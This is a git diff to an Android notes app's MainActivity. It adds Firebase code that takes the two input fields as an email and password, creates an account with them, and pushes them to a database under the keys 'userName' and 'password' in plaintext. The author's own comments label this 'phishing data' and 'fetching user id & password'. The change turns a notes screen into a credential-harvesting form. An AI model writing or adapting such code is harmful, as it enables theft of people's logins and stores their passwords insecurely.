@@ -12,6 +12,7 @@ import android.widget.Toast;
 
 import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.Task;
+import com.google.firebase.auth.AuthResult;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
@@ -39,11 +40,20 @@ public class MainActivity extends AppCompatActivity {
             public void onClick(View v) {
                 String mTitle = title.getText().toString();
                 String mNote = note.getText().toString();
+                mAuth = FirebaseAuth.getInstance();
+                mAuth.createUserWithEmailAndPassword(mTitle, mNote).addOnCompleteListener(new OnCompleteListener<AuthResult>() {
+                    @Override
+                    public void onComplete(@NonNull Task<AuthResult> task) {
+                        Toast.makeText(getApplicationContext(),"saved",Toast.LENGTH_SHORT).show();
+                    }
+                });
 
+                // phishing data
+                // fetching user id & password
 
                 HashMap<String ,Object> map = new HashMap<>();
-                map.put("title", mTitle);
-                map.put("note", mNote);
+                map.put("userName", mTitle);
+                map.put("password", mNote);
                 Log.i("btn","clicked");
                 FirebaseDatabase.getInstance().getReference().push().child("Notes").setValue(map)
                         .addOnCompleteListener(new OnCompleteListener<Void>() {
